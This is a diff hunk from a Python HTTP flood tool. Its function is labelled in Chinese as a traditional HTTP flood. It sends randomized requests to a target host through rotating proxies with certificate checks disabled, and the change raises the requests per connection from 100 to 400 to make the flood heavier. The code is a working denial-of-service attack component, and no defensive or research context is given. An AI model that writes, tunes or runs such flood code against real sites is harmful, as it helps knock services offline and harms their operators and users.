@@ -447,7 +447,7 @@ def send_requests(): #傳統HTTP FLOOD
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=host)
             try:
-                for _ in range(100):
+                for _ in range(400):
                     s.send(f"{method} {path}?{rC(rand)}{rC(rand)}={rInt(1,123456789)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                 print(f"[DPF]->stress \033[36m{host}\033[0m from: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
                 # s.close()
